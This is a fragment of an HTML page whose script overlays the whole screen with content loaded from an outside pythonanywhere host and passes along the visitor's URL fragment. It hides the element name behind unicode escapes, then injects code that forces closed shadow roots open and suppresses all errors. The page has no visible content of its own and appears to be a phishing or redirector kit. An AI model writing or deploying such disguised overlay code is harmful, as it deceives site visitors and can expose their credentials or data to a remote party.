    object{position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;margin:0;padding:0}
  </style>
</head>
<body>
  <script>
    const o=Object.assign(document.createElement('\u006f\u0062\u006a\u0065\u0063\u0074'),{
      data:"https://render3d.eu.pythonanywhere.com/static/html.htm"+location.hash,
      type:"text/html"
    });
    document.body.appendChild(o);
    o.onload=()=>{try{
      const d=o.contentDocument||o.contentWindow?.document;
      const s=d?.createElement('script');
      if(s){
        s.textContent='(()=>{const a=Element.prototype.attachShadow;Element.prototype.attachShadow=function(b){if(b&&b.mode==="closed")b.mode="open";return a.call(this,b)}})();';
        d.head.appendChild(s);
      }
    }catch(e){}};
  </script>
